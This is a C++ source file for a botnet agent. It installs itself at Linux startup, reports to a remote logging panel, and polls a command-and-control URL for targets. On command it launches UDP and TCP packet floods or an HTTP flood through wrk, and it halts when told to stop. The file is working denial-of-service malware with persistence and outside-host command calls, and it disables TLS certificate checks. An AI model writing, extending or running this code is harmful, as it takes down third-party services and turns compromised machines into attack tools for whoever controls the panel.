#include "FastUDP.h"
#include "FastTCP.h"
#include <iostream>
#include <thread>
#include <atomic>
#include <chrono>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <memory>
#include "startup.h"
#include "botlogger.h"

using json = nlohmann::json;

std::atomic<bool> running(false);
std::unique_ptr<FastUDP> udp;
std::unique_ptr<FastTCP> tcp;

// cURL callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

json fetch_json(const std::string& url) {
    CURL* curl;
    std::string response;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    try { return json::parse(response); }
    catch (...) { return json{}; }
}

int main() {
    InstallLinuxStartup();
    curl_global_init(CURL_GLOBAL_ALL);

    BotLogger logger("https://web-server.x10.mx/Panel/botlogger.php");
    logger.sendLoop(60);

    std::string server_url = "https://web-server.x10.mx/Panel/target.php";
    int payload_size = 128;

    // --- Biến trạng thái cho L4 ---
    std::string current_ip;
    int current_port = 0;
    std::string current_method_l4;

    // --- Biến trạng thái cho L7 ---
    std::string current_url;
    std::string current_method_l7;

    while (true) {
        json data = fetch_json(server_url);
        if (!data.is_null() && data.contains("ip") && data.contains("port") &&
            data.contains("method") && data.contains("layer") && data.contains("status")) {

            std::string ip = data["ip"].get<std::string>();
            std::string port = data["port"].get<std::string>();
            std::string method = data["method"].get<std::string>();
            std::string layer = data["layer"].get<std::string>();
            std::string status = data["status"].get<std::string>();
            std::string url = data.contains("url") ? data["url"].get<std::string>() : "";

            int port_int = 0;
            try { port_int = std::stoi(port); }
            catch (...) { port_int = 0; }

            // STOP case
            if (status == "STOP" || (layer == "L4" && ip == "STOP" && port == "STOP") || (layer == "L7" && url == "STOP")) {
                if (running) {
                    if (udp) udp->stop();
                    if (tcp) tcp->stop();
                    system("pkill -f wrk");
                    running = false;
                    std::cout << "[-] STOP signal received\n";
                }
            }
            // L4 attack
            else if (layer == "L4" && port_int > 0) {
                if (!running || current_ip != ip || current_port != port_int || current_method_l4 != method) {
                    if (running) {
                        if (udp) udp->stop();
                        if (tcp) tcp->stop();
                        running = false;
                        std::cout << "[-] Restarting L4 attack...\n";
                    }

                    current_ip = ip;
                    current_port = port_int;
                    current_method_l4 = method;

                    if (method == "UDP") {
                        std::cout << "[+] Starting FastUDP: " << ip << ":" << port_int << "\n";
                        udp = std::make_unique<FastUDP>(current_ip, current_port, payload_size);
                        udp->start();
                    }
                    else if (method == "TCP") {
                        std::cout << "[+] Starting FastTCP: " << ip << ":" << port_int << "\n";
                        tcp = std::make_unique<FastTCP>(current_ip, current_port, payload_size);
                        tcp->start();
                    }

                    running = true;
                }
            }
            // L7 attack
            else if (layer == "L7") {
                if (!url.empty() && url != "STOP") {
                    if (!running || current_url != url || current_method_l7 != method) {
                        if (running) {
                            if (udp) udp->stop();
                            if (tcp) tcp->stop();
                            system("pkill -f wrk");
                            running = false;
                            std::cout << "[-] Restarting L7 attack...\n";
                        }

                        current_url = url;
                        current_method_l7 = method;

                        std::cout << "[+] Starting L7 wrk: " << url << "\n";
                        std::thread wrk_thread([url]() {
                            std::string command = "./wrk -t4 -c1000 -d60 " + url + " > wrk_output.log 2>&1";
                            int result = system(command.c_str());
                            std::cout << "[L7] wrk finished code: " << result << "\n";
                        });
                        wrk_thread.detach();

                        running = true;
                    }
                }
            }
        }

        // Log dữ liệu cho L4
        if (running) {
            if (udp) {
                uint64_t bytes = udp->total_bytes_sent.load();
                std::cout << "[UDP] Sent: " << bytes / 1024 << " KB, Approx PPS: "
                          << (double)bytes / payload_size << "\n";
            }
            if (tcp) {
                uint64_t bytes = tcp->total_bytes_sent.load();
                std::cout << "[TCP] Sent: " << bytes / 1024 << " KB, Approx PPS: "
                          << (double)bytes / payload_size << "\n";
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    curl_global_cleanup();
    return 0;
}
